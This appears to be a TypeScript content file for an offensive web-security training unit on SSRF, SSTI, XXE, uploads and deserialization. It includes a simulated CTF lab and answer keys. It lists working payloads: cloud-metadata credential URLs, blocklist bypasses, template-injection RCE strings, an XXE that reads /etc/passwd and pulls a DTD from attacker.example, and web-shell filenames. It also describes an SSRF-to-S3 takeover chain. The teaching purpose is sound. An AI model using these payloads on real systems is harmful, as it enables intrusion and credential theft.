import type { Unit } from "../types";

const unit7: Unit = {
  id: "advanced-web",
  index: 7,
  title: "Advanced Web: SSRF, SSTI, XXE, Upload",
  tagline: "The high-impact bug classes that chain into RCE.",
  tone: "offense",
  lessons: [
    {
      id: "ssrf",
      title: "SSRF",
      summary: "Make the server fetch things it shouldn't.",
      cards: [
        {
          title: "The pattern",
          body: [
            "Any feature where the server fetches a URL you supply — image proxies, webhooks, 'import from URL', PDF generators, URL previews, OpenGraph scrapers.",
            "Default assumption: the server will fetch http://169.254.169.254/latest/meta-data/ if you ask it to.",
          ],
          code: `# AWS instance metadata (IMDSv1)
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
→ returns AWS access keys for the instance's role.

# GCP metadata
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
   (requires Metadata-Flavor: Google header)

# internal services
http://localhost:9200/_cat/indices       (Elasticsearch)
http://127.0.0.1:8500/v1/kv/?recurse     (Consul)
http://localhost:6379/                   (Redis, via gopher://)`,
          tone: "offense",
        },
        {
          title: "Bypasses when there's a block list",
          body: [
            "Blocklists for 'localhost' and '127.0.0.1' are fragile. Try: 2130706433 (decimal), 0177.0.0.1 (octal), [::1] (IPv6), localtest.me (resolves to 127.0.0.1), DNS rebinding.",
            "Blind SSRF (no response visible): use Burp Collaborator or a controlled DNS/HTTP server. If your collaborator receives a hit, SSRF is confirmed and you can show impact via timing / out-of-band data.",
          ],
          code: `# equivalent-but-not-literally-"127.0.0.1" tricks
http://127.1
http://2130706433
http://0177.0.0.1
http://[::1]
http://localhost.collab.yourid.oastify.com  (DNS rebinding)`,
          tone: "offense",
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "An 'import from URL' feature on AWS. First probe?",
          options: [
            "http://google.com",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "http://localhost:3306",
            "http://[::1]:22",
          ],
          answer: 1,
          explain: "The IMDS endpoint. On IMDSv1 (still common on legacy instances) it leaks the IAM role's credentials.",
        },
        {
          type: "mc",
          q: "The response body is never shown back. How do you confirm SSRF?",
          options: [
            "Give up",
            "Use Burp Collaborator — point the fetch at a unique OOB domain, watch for the callback",
            "Rely on timing only",
            "Scan a different site",
          ],
          answer: 1,
          explain:
            "Collaborator gives you a unique domain that logs any DNS lookup or HTTP hit — the gold-standard confirmation for blind bugs.",
        },
      ],
    },
    {
      id: "ssti",
      title: "SSTI: server-side template injection",
      summary: "When the template engine evaluates attacker input.",
      cards: [
        {
          title: "The pattern",
          body: [
            "The app concatenates user input into a server-side template string. The template engine executes it. On many engines that leads straight to RCE.",
          ],
          code: `# Jinja2 (Python / Flask)
{{7*7}}        → 49       confirmed SSTI
{{config}}     → entire app config, often leaking secrets
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}   → RCE

# ERB (Rails)
<%= 7*7 %> → 49
<%= \`id\` %>

# Twig (PHP)
{{7*7}} → 49
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}

# Thymeleaf (Java)
__\${T(java.lang.Runtime).getRuntime().exec("id")}__::.x`,
          tone: "offense",
        },
        {
          title: "The {{7*7}} test",
          body: [
            "The universal first probe. If the response contains 49, the engine is evaluating. If it contains the literal '{{7*7}}', it isn't.",
            "Different engines have different RCE paths — identify the engine from framework fingerprinting first, then search for the engine's exploit payload in PayloadsAllTheThings.",
          ],
        },
      ],
      exercises: [
        {
          type: "fill",
          q: "What is the universal first SSTI probe?",
          answers: ["{{7*7}}", "7*7"],
          explain: "Response containing 49 = SSTI. Response containing the literal braces = no.",
        },
      ],
    },
    {
      id: "xxe-upload-deser",
      title: "XXE, uploads, deserialization",
      summary: "Three more routes to high-severity findings.",
      cards: [
        {
          title: "XXE",
          body: [
            "Any endpoint accepting XML, including hidden ones (DOCX, SVG uploads, SAML, SOAP). Define an external entity, read local files, do SSRF.",
          ],
          code: `<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<data>&xxe;</data>

<!-- Blind XXE: define a parameter entity that fetches your attacker DTD -->
<!DOCTYPE foo [<!ENTITY % x SYSTEM "http://attacker.example/x.dtd"> %x;]>`,
          tone: "offense",
        },
        {
          title: "File upload",
          body: [
            "Attack surface order: filename handling, content handling, where it's served from, who executes it.",
            "Classic chain: upload shell.php, server renames to .jpg, you find it at /uploads/shell.php.jpg — not RCE. But upload shell.phtml, or shell.php.jpg where Apache's AddHandler misreads double extensions — RCE.",
            "SVG uploads = XSS when rendered inline. Polyglot files (JPG + PHP) still work on badly configured hosts.",
            "'Avatar upload' + path traversal in filename ('../../etc/cron.d/x') = classic.",
          ],
          code: `# payloads to try
shell.php
shell.php.jpg       (double extension)
shell.phtml
shell.pHp
shell.php%00.jpg    (null-byte, older PHP)
"><svg onload=alert(1)>.svg
../../../../tmp/x.php`,
          tone: "offense",
        },
        {
          title: "Insecure deserialization",
          body: [
            "An app receives serialized objects from the client (Java, PHP, .NET, Python pickle). The deserializer instantiates whatever class the attacker names, calling its magic methods.",
            "Toolchains like ysoserial build pre-made 'gadget chains' that end in RCE for popular stacks.",
            "Spotting it: look for base64 blobs in cookies/parameters that decode to recognisable serialization headers (`rO0AB...` = Java, `O:8:\"...` = PHP, `\\x80\\x04...` = Pickle).",
          ],
          tone: "offense",
        },
      ],
      exercises: [
        {
          type: "match",
          q: "Match the magic prefix to the format.",
          pairs: [
            ["rO0AB", "Java serialized object"],
            ["O:8:", "PHP serialized object"],
            ["\\x80\\x04", "Python pickle"],
            ["eyJ", "JWT / base64 JSON"],
          ],
          explain: "If you see rO0AB in a cookie, your heart should skip. Java deser is often an instant RCE.",
        },
        {
          type: "mc",
          q: "Upload accepts `shell.php.jpg`, saves it as `shell.php.jpg`, Apache has `AddHandler php .php`. What happens on request?",
          options: [
            "Nothing, it's a JPG",
            "Apache's handler can be triggered by any filename containing .php — RCE",
            "The server deletes it",
            "The browser renders it",
          ],
          answer: 1,
          explain: "AddHandler matches the extension as a substring. Classic misconfig turning upload into RCE.",
        },
      ],
    },
    {
      id: "chains",
      title: "Chaining bugs",
      summary: "Low-severity + low-severity = critical.",
      cards: [
        {
          title: "The craft is in the chain",
          body: [
            "A single low-severity finding often doesn't pay. Chain two or three and you have a critical.",
            "Common chains:",
            "- open redirect + OAuth misconfig → account takeover",
            "- CRLF injection → cache poisoning → stored XSS → mass session theft",
            "- SSRF → IMDS → cloud credentials → S3 bucket write → supply-chain",
            "- subdomain takeover → cookie Domain=.example.com → session read on main app",
          ],
          tone: "offense",
          code: `example chain: 'the SaaS takeover'

1. recon finds api.old.target.example  →  200, Rails 5
2. app has 'export URL' feature → SSRF against 169.254.169.254
3. IMDS returns IAM creds with s3:*
4. attacker writes a modified JS bundle into shared assets bucket
5. main app loads bundle on next deploy → stored XSS for every user
6. combined report: critical, worth a full tier bounty.`,
        },
      ],
      exercises: [
        {
          type: "mc",
          q: "You find an open redirect on /logout?next=... Low severity on its own. What is the classic chain partner?",
          options: ["XSS", "OAuth / SAML misconfig that uses `next` as the post-login redirect", "SSRF", "CSRF"],
          answer: 1,
          explain:
            "Open redirect + OAuth that whitelists just the host → attacker steals the auth code after login → account takeover. Low+Low=Critical.",
        },
      ],
    },
  ],
  lab: {
    id: "lab-advanced-web",
    title: "CTF: metadata heist",
    tone: "offense",
    briefing: [
      "Target: https://shop.example — an image-import feature.",
      "Chain SSRF → IMDS → S3 to find the flag.",
      "Flag format: FLAG{...}",
    ],
    terminal: {
      host: "hunter@kali",
      commands: {
        "curl -i 'https://shop.example/import?url=https://picsum.photos/200'":
          "HTTP/1.1 200 OK\n<img imported from https://picsum.photos/200 size=4321>",
        "curl -i 'https://shop.example/import?url=http://127.0.0.1:9200/_cat/indices'":
          "HTTP/1.1 400 Bad Request\n{\"error\":\"blocked host: localhost/127.0.0.1\"}",
        "curl -i 'https://shop.example/import?url=http://2130706433/_cat/indices'":
          "HTTP/1.1 200 OK\ngreen open shop-items 5 1 10000\ngreen open shop-users 5 1 10000\n(hint: decimal-encoded 127.0.0.1 bypassed the blocklist)",
        "curl -i 'https://shop.example/import?url=http://169.254.169.254/latest/meta-data/'":
          "HTTP/1.1 200 OK\nami-id\nhostname\niam/\nsecurity-credentials/\n...",
        "curl -i 'https://shop.example/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'":
          "HTTP/1.1 200 OK\nshop-import-role",
        "curl -i 'https://shop.example/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-import-role'":
          "HTTP/1.1 200 OK\n{\n  \"AccessKeyId\": \"AKIAIMPORTEXAMPLE1\",\n  \"SecretAccessKey\": \"wJalr...FAKE\",\n  \"Token\": \"IQoJb3JpZ2luX2VjE...\",\n  \"Expiration\": \"2026-10-08T04:00:00Z\"\n}",
        "aws s3 ls":
          "2026-01-02 00:00:00 shop-assets\n2026-01-02 00:00:00 shop-user-uploads\n2026-01-02 00:00:00 shop-internal-flags",
        "aws s3 ls s3://shop-internal-flags":
          "2026-10-01 00:00:00    42 ctf.txt",
        "aws s3 cp s3://shop-internal-flags/ctf.txt -":
          "FLAG{ssrf_imds_s3_the_classic_cloud_chain}",
        "curl -i 'https://shop.example/import?url=http://localhost:9200/'":
          "HTTP/1.1 400 Bad Request\n{\"error\":\"blocked host\"}",
      },
      hints: [
        "curl -i 'https://shop.example/import?url=http://127.0.0.1:9200/_cat/indices'",
        "curl -i 'https://shop.example/import?url=http://2130706433/_cat/indices'",
        "curl -i 'https://shop.example/import?url=http://169.254.169.254/latest/meta-data/'",
        "curl -i 'https://shop.example/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'",
        "curl -i 'https://shop.example/import?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-import-role'",
        "aws s3 ls",
        "aws s3 cp s3://shop-internal-flags/ctf.txt -",
      ],
    },
    tasks: [
      {
        q: "Which encoding of 127.0.0.1 bypasses the host blocklist?",
        answers: ["2130706433", "decimal", "decimal encoding"],
        hint: "32-bit integer representation of 127.0.0.1.",
      },
      {
        q: "What is the name of the IAM role attached to the instance?",
        answers: ["shop-import-role"],
        hint: "The IMDS iam/security-credentials/ endpoint lists it.",
      },
      {
        q: "Which S3 bucket contains the flag?",
        answers: ["shop-internal-flags", "s3://shop-internal-flags"],
        hint: "`aws s3 ls` after exporting the credentials.",
      },
      {
        q: "What is the flag?",
        answers: ["FLAG{ssrf_imds_s3_the_classic_cloud_chain}", "ssrf_imds_s3_the_classic_cloud_chain"],
        hint: "`aws s3 cp s3://shop-internal-flags/ctf.txt -`.",
      },
    ],
  },
  ids: {
    name: "Advanced web kit",
    description:
      "You can find SSRF, SSTI, XXE, dangerous uploads and insecure deserialization — the bug classes that chain into cloud takeover.",
    rules: [],
  },
};

export default unit7;
